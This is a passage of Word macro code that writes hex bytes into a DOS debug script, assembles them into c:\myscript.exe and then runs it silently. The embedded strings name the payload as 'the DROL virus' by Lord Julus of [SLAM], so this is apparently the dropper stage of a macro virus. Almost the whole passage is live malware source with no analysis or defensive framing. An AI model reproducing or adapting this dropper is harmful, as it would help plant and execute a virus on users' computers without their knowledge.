WordBasic.Insert "print #1, " + Chr(34) + _
"e 1780 6a 00 6a 01 68 00 00 00 c0 56 ff 95 c1 11 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1790 89 85 49 17 40 00 83 f8 ff 74 7b 6a 00 8d 85 f5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17a0 23 40 00 50 68 46 01 00 00 8d 85 af 22 40 00 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17b0 ff b5 49 17 40 00 ff 95 f9 11 40 00 ff b5 49 17 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17c0 40 00 ff 95 c5 11 40 00 8d 85 f9 23 40 00 50 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17d0 85 fd 23 40 00 50 6a 00 68 3f 00 0f 00 6a 00 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17e0 00 6a 00 8d 85 01 24 40 00 50 68 01 00 00 80 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17f0 95 29 12 40 00 6a 19 8d 85 a2 21 40 00 50 6a 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1800 6a 00 8d 85 17 24 40 00 50 8b 85 fd 23 40 00 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1810 ff 95 2d 12 40 00 61 c3 44 52 4f 4c 20 76 31 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1820 30 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1830 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1840 20 20 20 00 0d 0a 0d 0a 54 68 69 73 20 69 73 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1850 74 68 65 20 44 52 4f 4c 20 76 69 72 75 73 0d 0a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1860 0d 0a 63 6f 70 79 72 69 67 68 74 20 28 43 29 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1870 4c 6f 72 64 20 4a 75 6c 75 73 20 2f 20 5b 53 4c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1880 41 4d 5d 0d 0a 0d 0a 77 72 69 74 74 65 6e 20 66 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1890 6f 72 20 66 75 6e 2e 2e 2e 20 3b 2d 29 0d 0a 0d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18a0 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19a0 00 00 00 00 00 00 64 72 6f 6c 2e 63 75 72 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19b0 00 02 00 01 00 20 20 02 00 00 00 00 00 30 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19c0 00 16 00 00 00 28 00 00 00 20 00 00 00 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19d0 00 01 00 01 00 00 00 00 00 00 02 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19f0 00 ff ff ff 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a00 00 00 00 00 00 00 05 28 00 00 05 28 00 00 05 28 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a10 00 00 07 f8 00 00 03 f0 00 00 03 f0 00 00 07 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a20 00 00 07 38 00 00 0e 1c 00 00 0f 3c 00 00 1f 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a30 00 00 1f fe 00 00 1d ee 00 00 18 c6 00 00 1d ee " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a40 00 00 1f fe 00 00 0f fe 00 00 0f fc 00 00 0f fc " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a50 00 00 07 f8 00 00 07 f8 00 00 01 e0 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a70 00 00 00 00 00 ff ff ff fc ff ff ff f8 ff fd 2f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a80 f1 ff f8 07 e3 ff f0 03 c7 ff f0 03 8f ff f0 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a90 1f ff f0 02 3f ff f8 04 7f ff f8 00 ff ff f0 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1aa0 ff ff f0 03 ff ff e0 01 ff ff e0 01 ff ff c0 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ab0 ff ff c0 00 ff ff c0 00 ff ff c0 00 ff ff c0 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ac0 ff ff c0 00 ff ff c0 00 ff ff 80 01 ff ff 00 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ad0 ff ee 30 03 ff ec 70 03 ff c8 f8 07 ff c1 fe 1f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ae0 ff c3 ff ff ff 80 7f ff ff 81 ff ff ff 8f ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1af0 ff 7f ff ff ff 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b00 00 43 6f 6e 74 72 6f 6c 20 50 61 6e 65 6c 5c 43 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b10 75 72 73 6f 72 73 00 41 72 72 6f 77 00 60 8d bd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b20 3d 12 40 00 8d b5 0e 18 40 00 8b 06 03 c5 80 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b30 ff 74 24 57 50 ff 95 9d 11 40 00 83 f8 ff 74 11 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b40 50 8d 5f 2c 53 ff 95 f1 11 40 00 ff 95 c5 11 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b50 00 66 83 c6 04 eb d3 61 c3 60 b8 05 00 00 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b60 61 00 00 00 83 c0 03 bb 07 00 00 00 2b d8 8d bd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b70 9f 17 40 00 b0 2e aa b9 07 00 00 00 3b cb 76 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b80 b8 19 00 00 00 e8 3b 00 00 00 83 c0 61 aa e2 ec " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b90 b0 00 aa e2 e7 61 c3 50 8b 44 24 f8 01 85 c1 24 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ba0 40 00 58 c3 51 33 c9 8b 85 c1 24 40 00 66 b9 21 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bb0 00 03 c0 73 02 34 c5 e2 f8 89 85 c1 24 40 00 59 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bc0 c3 01 00 00 00 52 51 ba 00 00 00 00 50 e8 d2 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bd0 ff ff 59 f7 f1 92 59 5a c3 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f00 00 10 00 00 54 01 00 00 0e 38 12 38 16 38 1a 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f10 1e 38 22 38 26 38 2a 38 38 38 83 38 99 38 ae 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f20 b4 38 be 38 c6 38 cc 38 d3 38 d9 38 e0 38 e6 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f30 ed 38 f3 38 f9 38 00 39 06 39 0c 39 14 39 1e 39 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f40 35 39 41 39 48 39 50 39 5d 39 6d 39 77 39 7d 39 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f50 83 39 88 39 93 39 9a 39 e1 39 e7 39 0e 3a 16 3a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f60 21 3a 2a 3a 37 3a 3e 3a 49 3a 50 3a 56 3a 62 3a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f70 68 3a 71 3a 85 3a 8c 3a 92 3a a1 3a a8 3a ae 3a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f80 bd 3a c4 3a cb 3a d4 3a db 3a f4 3a fb 3a 08 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f90 1f 3b 25 3b 30 3b 3d 3b 44 3b 58 3b 5e 3b 65 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fa0 70 3b 7c 3b 3e 38 49 38 ef 39 fa 39 92 3b 98 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fb0 a6 3b b8 3b c0 3b c6 3b cc 3b d4 3b e0 3b e6 3b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fc0 ec 3b fb 3b 08 3c 19 3c 52 3c 6c 3c 75 3c 7e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fd0 87 3c 93 3c 9c 3c b6 3c c9 3c cf 3c de 3c ea 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fe0 01 3d 0b 3d 22 3d 39 3d 43 3d 56 3d 6d 3d 8c 3d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ff0 95 3d b1 3d c1 3d db 3d e5 3d eb 3d f7 3d 46 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2000 4f 3e 5a 3e 6c 3e 75 3e 87 3e 9f 3e b4 3e c7 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2010 d5 3e e2 3e ed 3e f5 3e fb 3e 01 3f 07 3f 11 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2020 17 3f 1d 3f 23 3f 29 3f 2e 3f 3f 3f 45 3f 4b 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2030 51 3f 57 3f 5d 3f 63 3f 6f 3f 7d 3f 84 3f 93 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2040 99 3f a0 3f a7 3f b8 3f c1 3f f2 3f f9 3f e0 3f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2050 e7 3f 00 00 00 20 00 00 54 00 00 00 0a 30 12 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2060 21 30 27 30 2f 30 3e 30 50 30 8c 30 92 30 b2 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2070 b8 30 be 30 c4 30 f1 30 12 31 49 30 56 30 69 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2080 76 30 9f 30 ab 30 ca 30 d1 30 e5 30 f9 30 04 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2090 0b 31 20 34 26 34 37 34 47 34 4d 34 70 34 9e 34 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20a0 a9 34 bb 34 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"RCX" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"2000" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"W" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"Q" + _
Chr(34) + T$
WordBasic.Insert "Close #1" + T$
WordBasic.Insert "Shell " + Chr(34) + "debug < c:\myscript.scr > nul" + _
Chr(34) + T$
WordBasic.Insert "Shell " + Chr(34) + "c:\myscript.exe > nul" + _
Chr(34) + T$
End Sub

